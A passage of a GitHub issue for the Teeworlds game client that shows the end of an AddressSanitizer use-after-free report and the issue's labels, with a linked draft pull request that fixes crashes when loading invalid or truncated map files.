fd fd fd fd fd fd fd fd fd fd   0x0c3e8001dcb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd   0x0c3e8001dcc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c3e8001dcd0: fd fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd   0x0c3e8001dce0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd   0x0c3e8001dcf0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd   0x0c3e8001dd00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd   0x0c3e8001dd10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd   0x0c3e8001dd20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb   Shadow gap:              cc ==31394==ABORTING  ```  Doesn't crash without ASAN. |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@oy](https://avatars.githubusercontent.com/u/293850?s=40&v=4)](/oy)
[oy](/oy)
added
[bug](/teeworlds/teeworlds/labels/bug)
[client](/teeworlds/teeworlds/labels/client)
[code review](/teeworlds/teeworlds/labels/code%20review)
labels
[Nov 28, 2021](#event-5680898835)

[![@Robyt3](https://avatars.githubusercontent.com/u/23437060?s=40&v=4)](/Robyt3)
[Robyt3](/Robyt3)
linked a pull request
[Dec 25, 2021](#ref-pullrequest-971169147)
that will
close
this issue

[Datafile validation: Fix illegal memory accesses (server/client crashes) and map corruption when loading invalid or truncated map files
#2931](/teeworlds/teeworlds/pull/2931)
 Draft

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fteeworlds%2Fteeworlds%2Fissues%2F2970)

Assignees

No one assigned

Labels

[bug](/teeworlds/teeworlds/labels/bug)
[client](/teeworlds/teeworlds/labels/client)
[code review](/teeworlds/teeworlds/labels/code%20review)

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [Datafile validation: Fix illegal memory accesses (server/client crashes) and map corruption when loading invalid or truncated map files](/teeworlds/teeworlds/pull/2931)
 [Robyt3/teeworlds](/Robyt3/teeworlds)

2 participants

[![@oy](https://avatars.githubusercontent.com/u/293850?s=52&v=4)](/oy) [![@mmmds](https://avatars.githubusercontent.com/u/4034742?s=52&v=4)](/mmmds)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


